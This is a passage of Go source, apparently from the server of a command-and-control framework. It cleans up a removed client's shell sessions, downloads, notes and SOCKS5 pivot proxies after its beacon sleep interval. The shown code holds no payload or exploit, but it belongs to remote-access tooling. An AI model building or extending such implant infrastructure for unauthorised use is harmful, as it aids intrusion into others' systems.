		duration, _ := time.ParseDuration(client.Sleep + "s")
		time.Sleep(duration)

		database.Engine.Where("uid = ?", uid).Delete(&database.Clients{})
		database.Engine.Where("uid = ?", uid).Delete(&database.Downloads{})
		database.Engine.Where("uid = ?", uid).Delete(&database.Notes{})
		database.Engine.Where("uid = ?", uid).Delete(&database.Shell{})

		var socks5 []database.Socks5
		database.Engine.Where("uid = ?", uid).Find(&socks5)
		for _, s := range socks5 {
			if _, exists := proxy.Socks5Serve[s.Socks5port]; exists {
				proxy.Socks5Serve[s.Socks5port].Close()
				proxy.MuSocks5Serve.Lock()
				delete(proxy.Socks5Serve, s.Socks5port)
				proxy.MuSocks5Serve.Unlock()
			}
		}
		database.Engine.Where("uid = ?", uid).Delete(&database.Socks5{})

		command.DeleteFileBrowserUID(uid)
	}()
}

// Sentinel errors for service layer.
var (
	errNotFound       = &ServiceError{msg: "not found"}
	errAlreadyExists  = &ServiceError{msg: "already exists"}
	errAlreadyRunning = &ServiceError{msg: "already running"}
	errPortInUse      = &ServiceError{msg: "port in use"}
)

type ServiceError struct{ msg string }

func (e *ServiceError) Error() string { return e.msg }
